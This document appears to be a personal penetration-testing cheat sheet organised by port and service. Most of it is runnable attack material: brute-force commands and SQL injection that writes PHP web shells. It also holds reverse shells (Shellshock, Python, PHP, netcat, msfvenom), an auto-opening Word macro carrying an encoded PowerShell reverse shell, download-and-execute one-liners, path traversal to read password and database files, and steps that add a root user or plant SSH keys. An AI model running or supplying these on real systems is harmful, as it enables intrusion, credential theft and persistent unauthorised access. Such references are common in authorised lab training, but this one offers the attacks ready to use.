# QCA Refined (1)

### Download Essential Tools

```bash
https://github.com/danielmiessler/SecLists; wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/linpeas.sh; wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe; wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt; git clone https://github.com/dionach/CMSmap; wget https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py; wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64; wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh; https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl; wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1; wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1; wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1; wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe; wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe; wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh; wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

### Export Target IP Address

```bash
export ip=$(cat ip.txt)
```

### Nmap scan (aggressive & full port scan)

```bash
echo 192.168.x.x > ip.txt; export ip=$(cat ip.txt); nmap $ip -sV -A -Pn -oN sVAPn.txt
```

```bash
export ip=$(cat ip.txt); nmap $ip -p- -Pn -oN pPn.txt
```

```bash
export ip=$(cat ip.txt); nmap -sU -p- -Pn -T4 $ip -oN sUpPn.txt
```

### Useful Page

[https://nets.ec/Main_Page](https://nets.ec/Main_Page)

---

### Port 21 - FTP Brute Force

Wordlist for FTP brute force available at:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)

Always try **admin** as a possible username

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt && cat ftp-betterdefaultpasslist.txt| awk -F ':' '{print $1}' > ftp_usernames.txt && cat ftp-betterdefaultpasslist.txt| awk -F ':' '{print $2}' > ftp_passwords.txt
```

```bash
hydra -L ftp_usernames.txt -P ftp_passwords.txt $ip ftp -V -f
```

### FTP Recursive Download

```bash
wget -r ftp://user:pass@server.com/
```

### FTP Bounce Attack Downloading Files

```bash
get ..\\xampp\\passwords.txt
```

---

### Port 22 - Problems logging in with SSH

Server that requires diffie-hellman-group1-sha1:

[https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0](https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0)

[https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)

```bash
ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss user@$ip
```

Still can’t login? Add the following to /etc/ssh/ssh_config

```bash
PubkeyAcceptedKeyTypes +ssh-dss
```

### Port 22 - Problems logging in with SSH (private key)

```bash
sign_and_send_pubkey: no mutual signature supported
```

Fix

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa $user@$ip
```

---

### Port 25 - SMTP User Enumeration

If **VRFY** doesn’t work, try **RCPT** and **EXPN**.

```bash
smtp-user-enum -M VRFY -D $subdomain.$com -U smtp_usernames.txt -t $ip
```

```bash
smtp-user-enum -M VRFY -D $subdomain.$com -U /usr/share/wordlists/metasploit/namelist.txt -t $ip
```

---

### Port 53 - DNS Enumeration

```bash
dig @$ip d.c any
```

PTR lookup

```bash
dig @$ip -x $ip
```

Followed by AXFR zone transfer

```bash
dig axfr @$ip d.c
```

---

### Port 80 - Enumeration Tips

1. Login Page
- Try default or common credentials, passwords that are service names, sqli and null byte injection (if there is registration page)
1. Brute Force Directories (i.e. Fuzzing)
- Some “hidden” directories are actually the machine’s name itself, use ffuf if it does not work then use gobuster
- There are a good deal of wordlists here:

[https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

1. SQL Injection
- This is a good read for web pentesting, especially when it comes to SQL injection (mostly MSSQL)

[https://www.securityidiots.com/](https://www.securityidiots.com/)

1. If the above doesn’t work, try enumerating subdomains and use nikto
2. Websites that are running wordpress CMS can be scanned using wpscan while other CMS like Joomla, Drupal and Moodle can be scanned using cmsmap.py

### Curl

```bash
curl --path-as-is http://$ip/../../../etc/passwd -o passwd.txt
```

```bash
curl -G http://$ip/uploads/shell.php --data-urlencode "cmd=certutil -urlcache -split -f http://$ip/ncpp.exe" | html2text
```

Empty content length can be specified by using either of:

```bash
curl -X POST -d "" http://$ip
```

```bash
curl -s -i -X POST -H 'Content-Length: 0'
```

### Passive Web Directory Fuzzing

```bash
curl $ip -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

### Active Web Directory Fuzzing

```bash
ffuf -u "http://$ip/FUZZ" -w /usr/share/dirb/wordlists/common.txt
```

```bash
ffuf -mc all -fc 404 -u "http://$ip:10443/FUZZ" -w /usr/share/dirb/wordlists/common.txt
```

Detailed directory scan for hidden items

[https://www.notion.so/whitebear82/QCA-Refined-2-9db9a0bc4a414362b18ce9fdb36ea87d?pvs=4#3677fb3db4774234aab17ac2c21d5ddd](https://www.notion.so/QCA-Refined-2-9db9a0bc4a414362b18ce9fdb36ea87d?pvs=21)

```bash
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50
```

### Subdomain Enumeration

```bash
ffuf -u http://domain.com/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.domain.com" -fs 169
```

```bash
wfuzz -c -f domain.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://domain.com/" -H "Host: FUZZ.domain.com" --hl 39
```

### Additional Web Enumeration (dangerous files/CGI, cookies, etc.)

```bash
nikto +host $ip
```

### Webdav enabled

```bash
davtest -url http://$ip/ -auth 'user:pass'
```

### Wordpress

```html
wpscan --url http://$ip --enumerate vp
```

```bash
wpscan -u http://$ip/webservices/wp/ --enumerate p,t,u
```

[https://github.com/dionach/CMSmap](https://github.com/dionach/CMSmap)

```html
python3 cmsmap.py http://$ip
```

### Forgot Password PHP Page

Try

```bash
GET /forgot_pass.php?email=%0aid
```

### Shellshock Enumeration

```bash
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://$ip/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
```

Exploitation:

```bash
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/$kali_ip/443 0>&1' http://$ip/cgi-bin/admin.cgi
```

### SSRF (RFI) using Responder

```bash
responder -I tun0 -wv
```

---

### Port 443

Crack certificate password (.pfx)

```bash
pfx2john staff.pfx > staff.hash
```

### Port 110/143/995/993 - POP3/IMAP Enumeration

Banner grabbing

```bash
nc -nv $ip 110
```

```bash
nc -nv $ip 143
```

```bash
openssl s_client -connect $ip:995 -crlf -quiet
```

```bash
openssl s_client -connect $ip:993 -quiet
```

Enumerate further

```bash
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $ip
```

Read emails

```bash
for user in alice bob; do ( echo USER ${user}; sleep 2s; echo PASS 123; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $ip 110; done
```

Read email contents

```bash
for user in alice; do ( echo USER ${user}; sleep 2s; echo PASS 123; sleep 2s; echo LIST; sleep 2s; echo RETR 1; sleep 2s; echo RETR 2; sleep 2s; echo quit) | nc -nvC $ip 110; done
```

---

### Port 139,445 - SMB Enumeration

Run wireshark to see the SMB version

```bash
smbclient -L $ip
```

```bash
crackmapexecexec smb --shares $ip -u '' -p ''
```

```bash
crackmapexec smb --shares $ip -u 'guest' -p ''
```

```bash
 enum4linux -U -G -r $ip
```

```bash
smbmap -u '' -p '' -R -H $ip
```

```bash
smbget -U '' -R smb://$ip/$dir
```

```bash
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

---

### Brute Force Tools (Hydra, Medusa, Ncrack)

Simple Hydra Brute Force for specific services

> ftp, ssh, pop3, mysql
> 

```bash
hydra -L users.txt -P users.txt $ip ssh -V -f
```

```bash
hydra -L users.txt -P users.txt $ip ssh -vV -f -e nsr -I
```

```bash
hydra -L users.txt -P users.txt -e nsr -q ssh://$ip -t 4 -w 5 -V -f
```

```bash
medusa -h $ip -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
```

```bash
ncrack $ip -U users.txt -P users.txt -p ssh -f -v
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/folder/login.php:username=admin&password=^PASS^:Invalid Password!"
```

### MySQL Enumeration

```html
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip
```

### MSSQL Login

[https://amandinegh.gitbook.io/cyberadventure/common-services/mssql-3306](https://amandinegh.gitbook.io/cyberadventure/common-services/mssql-3306)

```bash
python3 mssqlclient.py -windows-auth DOMAIN/user:password@$ip
```

```bash
use MASTER
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC sp_configure 'show advanced options', 0
RECONFIGURE
```

xp_cmdshell to actual shell

```bash
xp_cmdshell copy \\$kali_ip\SHARE\nc.exe C:\Users\Public\nc.exe
```

```bash
xp_cmdshell c:\Users\Public\nc.exe -e cmd.exe $kali_ip 80
```

### MSSQL Injection

xp_cmdshell (MSSQL to RCE)

[https://guide.offsecnewbie.com/5-sql](https://guide.offsecnewbie.com/5-sql)

[https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/](https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/)

[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

[https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)

### SQL Injection to RCE

Peep at usernames in the table.

```bash
SELECT username FROM users WHERE username = '' AND 1= (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -
```

Inject RCE.

```bash
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/backdoor.php'  --
```

```bash
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'
```

### SQL Injection Cheatsheet

```bash
admin'||'1==1--
```

```bash
admin' || '1==1//
```

### SQL Injection to get user data (MariaDB)

```bash
' AND 1=2 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='user'--
```

### Union based SQL Injection

[http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html)

### MongoDB Login

```bash
mongo -u $user -p $pass localhost:27017/$db
```

### SSTI Injection (Java)

[https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md)

```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget $kali_ip/r.elf")}
```

### .GIT Enumeration

In the .git directory:

```bash
git ls-files --stage
```

```bash
git log
```

### RPC Enumeration

```bash
rpcclient -U "" -N $ip
```

### LDAP Enumeration

Great article to read up

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

```bash
ldapsearch -v -x -b "DC=$domain,DC=$com" -H "ldap://$ip" "(objectclass=*)"
```

```bash
ldapsearch -x -h $ip -D '' -w '' -b "DC=$domain,DC=$com" | grep sAMAccountName
```

```bash
ldapsearch -x -h $ip -D '' -w '' -b "DC=$domain,DC=$com" | grep description
```

Enumerate usernames given password

```bash
ldapsearch -x -H ldap://sub.domain.com -D 'DOMAIN\ldap' -w '$pass' -b "CN=Users,DC=$DOMAIN, DC=$COM" | tee saved.txt
```

```bash
ldapdomaindump -u 'DOMAIN\ldap' -p '$pass' sub.domain.com
```

Followed by CTRL + F the domain_user.json file for “info” to see if there’s passwords.

### WinDAP Search

[https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)

Enumerate all users

```bash
python3 windapsearch.py -d domain.com --dc-ip $ip -U
```

```bash
python3 windapsearch.py -u "" --dc-ip $ip -U --admin-objects
```

Enumerate all other objects

```bash
python3 windapsearch.py -d domain.com --dc-ip $ip --custom "objectClass=*"
```

Enumerate users in “Remote Management Users”

```bash
python3 windapsearch.py -u "" --dc-ip $ip -U -m "Remote Management Users"
```

### IFC Enumeration

Grab [**ircsnapshot.py**](http://ircsnapshot.py) at:

[https://raw.githubusercontent.com/bwall/ircsnapshot/master/ircsnapshot/ircsnapshot.py](https://raw.githubusercontent.com/bwall/ircsnapshot/master/ircsnapshot/ircsnapshot.py)

```bash
python2 ircsnapshot.py
```

### IRC Enumeration (Unreal)

```bash
irssi -c $ip -n guest
```

### [Usernamer.py](http://Usernamer.py) - Jumble up to get naming conventions

[https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py](https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py)

```bash
python2 usernamer.py -n '$name $surname' >> smtp_usernames.txt
```

### Cewl - Extract keywords/texts from web service to get possible password list

```bash
cewl -d 5 http://$ip/$page -w pop_passwords.txt
```

### Found .git in website?

```bash
wget --mirror -I .git $ip/.git; cd $ip
```

```bash
git checkout -- .; ls
```

### Inaccessible git files? Extract using gitdumper.sh

[https://pentestbook.six2dez.com/enumeration/webservices/github](https://pentestbook.six2dez.com/enumeration/webservices/github)

```bash
./gitdumper.sh http://$ip/.git/ git
```

```bash
cd git
```

```bash
git checkout -- .
```

### URLdecode + Base64decode

```bash
echo -n $encoded_string |  "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));" | base64 -dn
```

### Base64encode + URLencode

```bash
urlencode $(echo -n admin | base64)
```

### Tar Unzip

```bash
tar -xf $file
```

### Find recursively for a specific word

```bash
grep -i -r 'password' .
```

### Find recursively for a specific filename

```bash
ls -R | grep -i $filename
```

### Node.js running?

Try to look out for a forum post and test input fields by supplying **1+1** to check the existence of **eval**.

### PHP replace function suspected? Profanity filter regex? preg_replace()?

[https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df](https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df)

### Vulnerable to File Extension rename?

E.g. only accept GIF files, use burp to intercept uploading of php-reverse-shell.php and change content-type from

```bash
Content-Type: application/x-php
```

to

```bash
Content-Type: image/gif
```

### Macros

[https://www.thedecentshub.tech/2021/08/reverse-shell-from-word-documents.html?m=1](https://www.thedecentshub.tech/2021/08/reverse-shell-from-word-documents.html?m=1)

[https://redtm.com/initial-access/microsoft-word-macro-payload/](https://redtm.com/initial-access/microsoft-word-macro-payload/)

> Open MSWord **File → Options → Customize Ribbon → Enable Developer Options**
> 

```bash
Sub processing()
'
' processing Macro
'
'
    Dim Str As String
    
    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
    Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
    Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
    Str = Str + "MQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAzADQAIgAsADQANA"
    Str = Str + "AzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBu"
    Str = Str + "AHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AG"
    Str = Str + "UAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUA"
    Str = Str + "MwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQ"
    Str = Str + "AgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABl"
    Str = Str + "AHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AG"
    Str = Str + "gAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0A"
    Str = Str + "IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATg"
    Str = Str + "BhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBD"
    Str = Str + "AEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAG"
    Str = Str + "kAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQA"
    Str = Str + "cwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQ"
    Str = Str + "B0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBu"
    Str = Str + "AGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAH"
    Str = Str + "MAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAA"
    Str = Str + "KABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJA"
    Str = Str + "BzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBl"
    Str = Str + "AG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAG"
    Str = Str + "UAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkA"
    Str = Str + "OwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbg"
    Str = Str + "BkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBM"
    Str = Str + "AGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AH"
    Str = Str + "MAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
    Str = Str + "KAApAA=="
ce    
    CreateObject("Wscript.shell").Run Str

End Sub
Sub AutoOpen()
    processing
End Sub
```

### Unprotect Spreadsheet (xlsx)

[http://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/](http://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/)

```bash
unzip bla.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr bla.xlsx *
```

### EXIF Tool

```bash
https://github.com/convisolabs/CVE-2021-22204-exiftool
```

### RCE Generator

[https://www.revshells.com/](https://www.revshells.com/)

```bash
curl -G http://$ip/uploads/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$kali_ip/443 0>&1'"
```

### Python Reverse Shell Codes

```bash
import pty
import socket
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$kali_ip",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

### PowerShell Reverse Shell

```bash
wget https://raw.githubusercontent.com/rioasmara/wordpress/master/rev.ps1
```

```bash
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$kali_ip/rev.ps1") | powershell -noprofile'
```

### HTA Reverse Shell

[https://lisandre.com/archives/11205](https://lisandre.com/archives/11205)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=${KALI_IP} LPORT=${LISTENER_PORT} -f hta-psh -o /var/www/html/poc_hta.hta
```

### Payload List

[https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)

### PHAR proc_open (PHP alternative) RCE (without using fsockopen)

[https://www.php.net/manual/en/function.proc-open.php](https://www.php.net/manual/en/function.proc-open.php)

```bash
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $kali_ip 80 >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

### Tomcat Manager Authenticated WAR File Upload Exploit

[https://github.com/thewhiteh4t/warsend](https://github.com/thewhiteh4t/warsend)

```bash
./warsend.sh $kali_ip 443 $ip 8080 tomcat s3cret revshell
```

### Grafana Exploit

```bash
python3 50581.py -H http://$ip:3000
```

Read grafana creds

```bash
/etc/grafana/grafana.ini
```

Dump SQLite database

```bash
curl --path-as-is http://$ip:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

Fire sqlitebrowser → right-click data_source for potential passwords and login through MySQL

```bash
mysql -u grafana -pP@ssw0rd! -h $ip
```

### EternalBlue Reads

[https://github.com/k4u5h41/MS17-010_CVE-2017-0143](https://github.com/k4u5h41/MS17-010_CVE-2017-0143)

```bash
git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143
```

[https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-windows-xp-with-custom-payload-fabbbbeb692f](https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-windows-xp-with-custom-payload-fabbbbeb692f)

[https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623](https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623)

### Evil-WINRM

```bash
evil-winrm -i comp.domain.com -u user -p pass
```

Share files

```bash
net use \\$kali_ip\EVILSHARE
cd \\$kali_ip\EVILSHARE
```

### Evil-WINRM (SSL)

Note: if have PFX file, we can evil-winrm without password

```bash
openssl pkcs12 -in bla.pfx -nocerts -out key.pem -nodes
```

```bash
openssl pkcs12 -in bla.pfx -nokeys -out cert.pem
```

```bash
evil-winrm -i $ip -c cert.pem -k key.pem -S
```

### MSFV Shells

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$myip LPORT=$myport -f elf -o shell
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$myip LPORT=$myport -f exe > shell.exe
```

```bash
msfvenom -p php/shell/reverse_tcp LHOST=$myip LPORT=$myport -f raw
```

### Certutil

```bash
certutil -urlcache -split -f http://$ip/nc.exe
```

```bash
<?php 
$exec = system('certutil.exe -urlcache -split -f "http://$myip/shell.exe" shell.exe', $val); 
?>
```

### Wget shell and execute one-liner

```bash
wget -P /tmp http://kali/shell && chmod +x /tmp/shell && /tmp/shell
```

### Transfer file using NC

Receiver:

```bash
nc -l -p 80 > file
```

Sender:

```bash
nc -w 3 $ip 80 < file
```

### Transfer file using shares

Attacker:

```bash
python3 smbserver.py EVILSHARE /home/kali/experiment
```

Victim:

```bash
copy \\ip-addr\share-name\file out-file
```

If not working, use the **-smb2support** option or use samba.

[https://ubuntu.com/server/docs/samba-file-server](https://ubuntu.com/server/docs/samba-file-server)

### Zip file password cracking

fcrackzip

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_files.zip
```

john

```bash
zip2john secret.zip > hash.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Python TTY Shell Spawn

```powershell
python -c "import pty; pty.spawn('/bin/bash');"
```

```bash
python3 -c "import pty; pty.spawn('/bin/bash');"
```

### Shell upgrade using SSH

1. On attacking machine, generate SSH key pair

```bash
ssh-keygen -t rsa -N '' -f /home/kali/.ssh/id_rsa
```

1. Copy public SSH key to the target and save it as /home/<target_user>/.ssh/authorized_keys

attacking machine:

```bash
cd .ssh
python3 -m http.server 80 
```

target machine:

```bash
mkdir /home/<target_user>/.ssh
wget http://$attacker_ip/id_rsa.pub -O /home/<target_user>/.ssh/authorized_keys
```

1. SSH to the target

```bash
ssh -o StrictHostKeyChecking=no <target_user>@$ip
```

### Decrypt RSA Keys

Example/sample of encrypted RSA keys

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
...
-----END RSA PRIVATE KEY-----
```

Obtain public key (if necessary use ssh2john to crack the password for the passphrase)

```bash
openssl rsa -in encrypted.key -pubout > key.pub
```

Obtain private key (if necessary use ssh2john to crack the password for the passphrase)

```bash
openssl rsa -in encrypted.key -out id_rsa
```

## Shell upgrade using SSH (2)

1. On the target.

```bash
mkdir /home/user/.ssh
chmod 0700 /home/user/.ssh
echo "ssh-rsa AAAAB3...SNj7NAs = kali@kali" > /home/user/.ssh/authorized_keys
chmod 0600 /home/user/.ssh/authorized_keys
```

1. On kali.

```bash
ssh user@ip
```

### Powershell download file

```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile("http://$yourip/$file", "C:\Users\$destfile")
```

```bash
powershell.exe Invoke-WebRequest -OutFile $destfile -Uri http://$yourip/$file
```

### Docker Container Enumeration

1. Check if you are in docker container

```bash
$ hostname
a7c367c2113d
```

1. In Docker containerization, file systems are often mounted between the host and a container. Check for file system mounts.

```bash
$ mount
/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

1. Double confirm

```bash
df -T /tmp
Filesystem     Type 1K-blocks    Used Available Use% Mounted on
/dev/sda1      ext4  16446332 4431884  11159308  29% /tmp
```

### LinPEAS/WinPEAS

[https://github.com/carlospolop/PEASS-ng/releases/tag/20220508](https://github.com/carlospolop/PEASS-ng/releases/tag/20220508)

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/linpeas.sh
```

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe
```

### Linux Smart Enumeration Script

An alternative to linPEAS.

[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### PrivEsc Guide Linux

[https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
sudo -l
```

```bash
cat /etc/crontab
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
netstat -tunlp
```

```bash
ss -tunlp
```

```bash
cat ~/.profile && cat ~/.bashrc
```

```bash
ls -la /var/backups
```

### Linux Kernel Exploits Binaries

[https://github.com/m0mkris/linux-kernel-exploits](https://github.com/m0mkris/linux-kernel-exploits)

An alternative to view running processes as non-root user

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

id shows that you’re in a non-default group? Find all files that are owned by this group.

```bash
find / -group $groupname 2>/dev/null
```

```bash
echo 'hacked:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:test:/root:/bin/bash' >> /etc/passwd
```

### Create /etc/passwd openssl password

```bash
openssl passwd -1 -salt salt password
```

### Run as a privilege group

```bash
sudo -g python_admin admin_python3
```

### Custom Python script found? - get capabilities

```bash
getcap /usr/bin/admin_python3
/usr/bin/admin_python3 = cap_setuid+ep
>>> import os
>>> os.setuid(0)
>>> os.system("bash")
```

### Escape Restricted Shell (using text editor)

```bash
$ ed
!/bin/sh
$ export PATH=/bin:/usr/bin
```

### Escape Restricted Environment (using at)

[https://gtfobins.github.io/gtfobins/at/#shell](https://gtfobins.github.io/gtfobins/at/#shell)

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

### Kernel Enum

```bash
cat /etc/issue
```

```bash
uname -a
```

Need to download if cross architecture.

```bash
apt install gcc-multilib -y
```

<aside>
💡 For exploit suggester 1: look at Exposure: highly probable

</aside>

[https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

<aside>
💡 For exploit suggester 2: use if exploit suggester 1 don’t work

</aside>

